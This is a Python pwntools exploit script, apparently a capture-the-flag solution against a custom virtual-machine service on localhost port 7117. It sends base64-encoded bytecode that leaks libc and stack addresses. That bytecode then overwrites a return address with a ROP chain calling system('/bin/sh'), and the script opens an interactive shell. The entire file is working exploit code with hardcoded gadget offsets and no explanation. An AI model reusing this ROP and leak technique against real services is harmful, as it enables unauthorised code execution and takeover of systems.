from pwn import *
import aquarius_assembler as asm
import base64

CODE_SIZE = 1024
LIBC_HEAP_LEAK_OFFSET = -0x8B8
LIBC_LEAK_OFFSET = 0x2044E0
ENVIRON_OFFSET = 0x20AD58
POP_RDI = 0x10F75B
POP_RSI = 0x110A4D
POP_RDX_LEAVE = 0x000000000009819C
POP_RAX = 0xDD237
BIN_SH = 0x1CB42F
SYSTEM = 0x58740
RET = 0x000000000009819C + 3
RET_ADDRESS_OFFSET = -0xAC0
SYSCALL = 0x98FA6


def main():

    # r77 - libc base
    # r88 - stack

    code = b""
    code += asm.add("r255", LIBC_HEAP_LEAK_OFFSET)
    code += asm.ldr64("r77", 0)
    code += asm.sub("r77", LIBC_LEAK_OFFSET)

    code += asm.mov("r255", "r77")
    code += asm.add("r255", ENVIRON_OFFSET)
    code += asm.ldr64("r88", 0)

    code += asm.mov("r255", "r88")
    code += asm.add("r255", RET_ADDRESS_OFFSET)

    ### rop ###

    # pop_rdi
    code += asm.mov("r111", "r77")
    code += asm.add("r111", POP_RDI)
    code += asm.str64(0, "r111")
    code += asm.add("r255", 8)

    # /bin/sh
    code += asm.mov("r111", "r77")
    code += asm.add("r111", BIN_SH)
    code += asm.str64(0, "r111")
    code += asm.add("r255", 8)

    # ret
    code += asm.mov("r111", "r77")
    code += asm.add("r111", RET)
    code += asm.str64(0, "r111")
    code += asm.add("r255", 8)

    # system
    code += asm.mov("r111", "r77")
    code += asm.add("r111", SYSTEM)
    code += asm.str64(0, "r111")
    code += asm.add("r255", 8)

    print("CODE LEN: ", len(code))

    code = code.ljust(CODE_SIZE, asm.hlt())

    io = remote("localhost", 7117)
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"base64 encoded rom> ", base64.b64encode(code))
    io.recvuntil(b"id: ")
    machine_id = io.recvline().strip()
    print("MACHINE ID:", machine_id)
    io.sendlineafter(b"> ", b"2")
    pause()
    io.sendlineafter(b"id> ", machine_id)
    io.interactive()


if __name__ == "__main__":
    main()
